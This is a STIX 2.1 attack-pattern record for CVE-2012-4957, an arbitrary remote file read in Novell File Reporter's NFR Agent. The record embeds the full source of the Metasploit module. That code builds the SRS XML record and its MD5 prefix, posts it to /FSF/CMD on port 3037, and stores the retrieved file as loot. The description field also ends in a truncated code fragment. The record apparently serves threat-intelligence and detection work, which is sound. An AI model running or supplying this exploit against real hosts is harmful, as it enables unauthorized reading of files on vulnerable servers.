{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f04dba1-fe11-4b73-8c1e-c24d65f35650",
    "created": "2024-08-14T16:29:51.631367Z",
    "modified": "2024-08-14T16:29:51.631371Z",
    "name": "NFR Agent SRS Record Arbitrary Remote File Access",
    "description": " NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve arbitrary files via a request to /FSF/CMD with a SRS Record with OPERATION 4 and CMD 103, specifying a full pathname. This module has been tested successfully against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File Reporter 1.0.1).  'References'   => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/novell_file_reporter_srs_fileaccess.rb",
            "external_id": "novell_file_reporter_srs_fileaccess.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'NFR Agent SRS Record Arbitrary Remote File Access',\n      'Description'  =>  %q{\n        NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve\n        arbitrary files via a request to /FSF/CMD with a SRS Record with OPERATION 4 and\n        CMD 103, specifying a full pathname. This module has been tested successfully\n        against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File\n        Reporter 1.0.1).\n      },\n      'References'   =>\n        [\n          [ 'CVE', '2012-4957' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/' ]\n        ],\n      'Author'       =>\n        [\n          'juan vazquez'\n        ],\n      'License'      => MSF_LICENSE,\n      'DisclosureDate' => \"Nov 16 2012\"\n    )\n\n    register_options(\n    [\n      Opt::RPORT(3037),\n      OptBool.new('SSL', [true, 'Use SSL', true]),\n      OptString.new('RFILE', [true, 'Remote File', 'c:\\\\windows\\\\win.ini'])\n    ])\n\n    register_autofilter_ports([ 3037 ])\n  end\n\n  def run_host(ip)\n\n    record = \"<RECORD><NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>103</CMD><PATH>#{datastore['RFILE']}</PATH></RECORD>\"\n    md5 = Rex::Text.md5(\"SRS\" + record + \"SERVER\").upcase\n    message = md5 + record\n\n    print_status(\"Retrieving the file contents\")\n\n    res = send_request_cgi(\n      {\n        'uri'     => '/FSF/CMD',\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"text/xml\",\n        'data'    => message\n      })\n\n    if res and res.code == 200 and not res.body =~ /<RESULT>/\n      loot = res.body\n      f = ::File.basename(datastore['RFILE'])\n      path = store_loot('novell.filereporter.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n      print_good(\"#{datastore['RFILE']} saved in #{path}\")\n    else\n      print_error(\"Failed to retrieve the file contents\")\n    end\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "\"Nov 16 2012\""
}